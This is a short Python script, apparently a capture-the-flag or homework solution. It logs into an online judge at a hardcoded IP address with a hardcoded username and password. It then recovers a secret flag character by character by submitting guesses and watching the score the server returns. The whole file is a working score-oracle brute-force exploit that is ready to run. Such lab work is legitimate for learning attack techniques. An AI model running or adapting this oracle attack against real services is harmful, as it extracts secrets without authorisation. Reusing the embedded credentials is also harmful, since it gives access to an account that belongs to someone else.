import requests
from bs4 import BeautifulSoup

url = 'http://140.112.187.51:45588'


def login(base_url, username, password):
    login_url = f"{base_url}/login"

    data = {
        "username": username,
        "password": password
    }

    session = requests.Session()
    session.post(login_url, data=data)

    return session  # now authenticated


def oracle(session, text):
    resp = session.post(
        f"{url}/submit/3",
        data={"code": text, "language": "python"}
    )

    soup = BeautifulSoup(resp.text, "html.parser")
    flash_divs = soup.select("div.flash.info")

    if flash_divs:
        # Clean the text
        result_text = flash_divs[0].get_text(strip=True)
        result = result_text.split(":")[1][1:]
        stat = result.split(",")[0].strip()
        score = int(result.split(",")[1].strip())
        return stat, score
    return None, None


def main():
    session = login(url, "fysty", "mortis00")
    flag = "HW12{"
    subset = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_}"
    current_score = 25

    for _ in range(15):
        for c in subset:
            stat, score = oracle(session, flag+c)
            if score > current_score:
                flag += c
                current_score = score
                print(flag)
                break
        else:
            print("Failed")
            break
        if stat == "Accepted":
            print("Accepted")
            print(flag)
            break


if __name__ == "__main__":
    main()
